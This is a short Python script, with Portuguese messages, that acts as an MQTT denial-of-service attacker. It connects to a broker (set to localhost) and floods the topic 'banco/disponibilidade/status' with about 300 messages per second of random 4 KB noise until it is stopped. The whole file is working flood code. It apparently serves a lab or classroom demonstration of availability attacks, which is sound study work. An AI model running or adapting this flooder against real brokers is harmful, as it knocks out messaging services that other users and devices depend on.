import json
import os
import time

import paho.mqtt.client as mqtt

BROKER = "localhost"
PORT = 1883
TARGET_TOPIC = "banco/disponibilidade/status"
FLOOD_RATE = 300
PAYLOAD_SIZE = 4096


def main():
    client_id = f"DisponibilidadeAttacker_{int(time.time())}"
    client = mqtt.Client(
        callback_api_version=mqtt.CallbackAPIVersion.VERSION2,
        client_id=client_id,
        clean_session=True,
    )
    client.connect(BROKER, PORT)

    print("ATAQUE DE NEGACAO DE SERVICO ATIVO")
    print(f"Client ID: {client_id}")
    print(f"Floodando o tópico {TARGET_TOPIC} com {FLOOD_RATE} msg/s\n")

    payload_noise = os.urandom(PAYLOAD_SIZE).hex()
    intervalo = 1.0 / FLOOD_RATE
    total_enviadas = 0

    try:
        while True:
            mensagem = {
                "tipo": "flood",
                "ruido": payload_noise,
                "timestamp": time.time(),
            }
            client.publish(TARGET_TOPIC, json.dumps(mensagem))
            total_enviadas += 1

            if total_enviadas % FLOOD_RATE == 0:
                print(f"{total_enviadas} mensagens maliciosas enviadas...")

            time.sleep(intervalo)
    except KeyboardInterrupt:
        print("\nAtaque interrompido pelo usuário")
    finally:
        client.disconnect()
        print("Atacante desconectado")


if __name__ == "__main__":
    main()
